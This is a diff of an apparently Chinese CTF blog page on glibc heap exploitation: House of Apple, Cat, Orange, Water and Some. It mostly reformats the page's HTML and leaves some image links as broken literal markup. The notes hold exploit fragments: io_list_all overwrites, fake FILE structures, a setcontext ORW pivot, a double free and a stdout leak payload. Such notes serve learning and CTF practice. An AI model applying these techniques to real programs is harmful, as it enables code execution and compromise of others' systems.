@@ -62,24 +62,33 @@
       <span class="post-date">
         January 1, 2024
       </span>
+
       
-      <span class="post-tags">
-        &middot;
         
-        <a class="tag" href="/tags/pwn/">#pwn</a>
+
         
-        <a class="tag" href="/tags/heap/">#heap</a>
         
-      </span>
+
+        
+        <span class="post-tags">
+          &middot;
+          
+            <a class="tag" href="/tags/pwn/">#pwn</a>
+          
+            <a class="tag" href="/tags/heap/">#heap</a>
+          
+        </span>
+        
       
+
     </div>
   </header>
 
   
-  
-  <aside class="toc" id="toc">
-    <h4 class="toc-title">Table of Contents</h4>
-    <nav id="TableOfContents">
+    
+    <aside class="toc" id="toc">
+      <h4 class="toc-title">Table of Contents</h4>
+      <nav id="TableOfContents">
   <ul>
     <li>
       <ul>
@@ -89,13 +98,13 @@
         <li><a href="#0x3house-of-">0x3:House of 🤖🎂</a></li>
         <li><a href="#0x4-house-of-">0x4 House of 🍊</a></li>
         <li><a href="#0x5-house-of-">0x5 House of 💧</a></li>
-        <li><a href="#house_of_some">HOUSE_OF_SOME</a></li>
+        <li><a href="#0x6-house_of_some">0x6 HOUSE_OF_SOME</a></li>
       </ul>
     </li>
   </ul>
 </nav>
-  </aside>
-  
+    </aside>
+    
   
 
   <div class="post-content">
@@ -151,7 +160,7 @@ edit(0,p64(fake_addr1)*2 + p64(heap_addr+0x290) + p64(io_list_all-0x20))
 add(10,0x550) #large bin--&gt;chunk2--&gt;chunk0
 效果是：&amp;io_list_all = *chunk2
 </code></pre><h2 id="0x2house-of-">0x2:House of 🍎②</h2>
-<p><img src="https://ret2ldz.github.io/images/apple.png" alt="">
+<p>![](<a href="https://ret2ldz.github.io/images/apple.png">https://ret2ldz.github.io/images/apple.png</a> null)
 这块的东西有点多，但这条链子实在是很厉害。</p>
 <h3 id="调用链如下如需调试直接b-_io_wdoallocbuf即可">调用链如下，如需调试直接b *_IO_wdoallocbuf即可</h3>
 <pre tabindex="0"><code>exit --&gt;&gt; __run_exit_handlers --&gt;&gt; _IO_cleanup --&gt;&gt; _IO_flush_all_lockp 
@@ -185,11 +194,11 @@ fake_IO_FILE=fake_IO_FILE+fake_wide_data+fake_vtable
 edit(2,fake_IO_FILE)
 </code></pre><p>我们可以使用gdb&gt;p (*(struct _IO_FILE_plus *)addr)，来快捷查看我们是否正确覆盖了结构体</p>
 <h3 id="orw">ORW</h3>
-<h5 id="遇到开了沙箱的题目需要orw我们需要用setcontext-gadget通过rdi控制rsp去进行栈迁移执行shellcode但是因为现在-setcontext-用的是-rdx-寄存器所以还利用了一个-magic_gadget">遇到开了沙箱的题目需要orw，我们需要用setcontext gadget通过rdi控制rsp去进行栈迁移执行shellcode，但是因为现在 setcontext 用的是 rdx 寄存器，所以还利用了一个 magic_gadget</h5>
+<p><strong>遇到开了沙箱的题目需要orw，我们需要用setcontext gadget通过rdi控制rsp去进行栈迁移执行shellcode，但是因为现在 setcontext 用的是 rdx 寄存器，所以还利用了一个 magic_gadget</strong></p>
 <p>mov rdx, qword ptr [rdi + 8]
 mov qword ptr [rsp], rax
 call qword ptr [rdx + 0x20];</p>
-<h5 id="如何寻找magic-gadget">如何寻找MAGIC GADGET??</h5>
+<h4 id="如何寻找magic-gadget">如何寻找MAGIC GADGET??</h4>
 <p>寻找方法1：在ida内使用ALT+T寻找指令</p>
 <pre tabindex="0"><code>mov     rdx, [rdi+8]
 </code></pre><p>寻找方法2：推荐使用这种排查</p>
@@ -247,21 +256,21 @@ dele(7) #helper :unsorted bin--&gt;big_chunk(helper+attacker)
 add(10) #从tcache中取：tcache[6]
 dele(8) #double free success!!!
 </code></pre><h2 id="0x4-house-of-">0x4 House of 🍊</h2>
-<h5 id="适用条件glibc-223--glibc-226程序中无free功能">适用条件：(glibc 2.23 ~ glibc 2.26,程序中无free功能)</h5>
+<p>适用条件：(glibc 2.23 ~ glibc 2.26,程序中无free功能)</p>
 <p>🍊过期辣，👴不学了</p>
 <h2 id="0x5-house-of-">0x5 House of 💧</h2>
 <p><strong>适用条件：解决无SHOW，存在UAF，且能够申请巨大堆块的题目，作用是泄露地址。</strong></p>
 <p>原理：tcache struct存在两个数组，一个存储指针，一个存储对应指针的堆块数量（一单位2字节）。如果我们申请两个大小相邻的堆块，我们就可以在堆块数量处构造出0x00010001，<strong>如果我们能把这个0x10001作为fake_chunk的size放入unsorted bin，由于unsorted bin会给fd和bk赋值我们就可以给这里面的前面的几个数组指针赋值上libc地址，再次申请即可申请到libc内的堆块</strong>。</p>
 <p><strong><code>我认为还有一个成因是因为tcache直接指向chunk的内容，而unsorted bins指向chunk的头部，我们且看下文就可以明白。</code></strong></p>
-<p>**绕过检查：**而我们需要绕过的就是让这样 fake unsorted chunk 在结束的时候的下个 chunk 的 prev_size 为 0x10000，且 size 的 issue 位为 0，因此我们需要申请大堆块，使prev size合法。</p>
+<p>绕过检查：而我们需要绕过的就是让这样 fake unsorted chunk 在结束的时候的下个 chunk 的 prev_size 为 0x10000，且 size 的 issue 位为 0，因此我们需要申请大堆块，使prev size合法。</p>
 <pre tabindex="0"><code>pwndbg&gt; x/2gx 0x55929cefb080+0x10000
 0000000000010000 0000000000000020
-</code></pre><p>**利用：**我们试着将两个chunk放入unsorted bin的时候，我们可以在unsorted_start-0x8和unsorted_end-0x8的位置上伪造size=0x20和size=0x30，然后释放其，可以看到 fake chunk 的fd 指针已经指向 unsorted_end，bk 指针已经指向 unsorted_start，因为其size底下正好是0x20、0x30堆块的指针，</p>
+</code></pre><p>利用：我们试着将两个chunk放入unsorted bin的时候，我们可以在unsorted_start-0x8和unsorted_end-0x8的位置上伪造size=0x20和size=0x30，然后释放其，可以看到 fake chunk 的fd 指针已经指向 unsorted_end，bk 指针已经指向 unsorted_start，因为其size底下正好是0x20、0x30堆块的指针，</p>
 <pre tabindex="0"><code>0x55929cefb070: 0x00000000      0x00000000      0x00000000      0x00000000
 0x55929cefb080: 0x00000000      0x00000000      0x00010001      0x00000000//这里是伪造的size
 0x55929cefb090: 0x9cefbcd0      0x00005592      0x9cefbc10      0x00005592//这里是通过释放fake_tcache写入的地址
 </code></pre><p>然后，我们释放三个fake_unsorted堆块，所以不难想到接下来的操作就是令 unsorted_start 的 fd 指针指向 fake unsorted chunk，unsorted_end 的 bk 指针指向 fake unsorted chunk （需要爆破一位）即可完成 unsorted bin 上堆块替换操作。</p>
-<p><img src="https://ret2ldz.github.io/images/unnamed.drawio.png" alt=""></p>
+<p>![](<a href="https://ret2ldz.github.io/images/unnamed.drawio.png">https://ret2ldz.github.io/images/unnamed.drawio.png</a> null)</p>
 <p>最困难的部分是：如何在在unsorted_start-0x10和unsorted_end-0x10的位置上伪造size0x20和size0x30，如下</p>
 <pre tabindex="0"><code>for i in range(8):
     add(0x88)
@@ -379,9 +388,9 @@ pwndbg&gt; x/10x 0x55e99e563060
 0x55e99e563060: 0x6ec125c0      0x00007ff9      0x00000000      0x00000000
 0x55e99e563070: 0x6ec118e0      0x00007ff9      0x00000000      0x00000000
 0x55e99e563080: 0x6ec124e0      0x00007ff9
-</code></pre><p>** 最后直接衔接stdout leak：p64(0xfbad1800)+p64(0x0)<em>3+&rsquo;\x00&rsquo;</em>*</p>
-<h2 id="house_of_some">HOUSE_OF_SOME</h2>
-<p><img src="https://blog.csome.cc/p/house-of-some/House-of-some.png" alt="img"></p>
+</code></pre><p>最后直接衔接stdout leak：p64(0xfbad1800)+p64(0x0)*<em>3+&rsquo;\x00'</em></p>
+<h2 id="0x6-house_of_some">0x6 HOUSE_OF_SOME</h2>
+<p>![img](<a href="https://blog.csome.cc/p/house-of-some/House-of-some.png">https://blog.csome.cc/p/house-of-some/House-of-some.png</a> null)</p>
 <pre tabindex="0"><code>fake_file_read = flat({
     0x00: 0, # _flags
     0x20: 0, # _IO_write_base
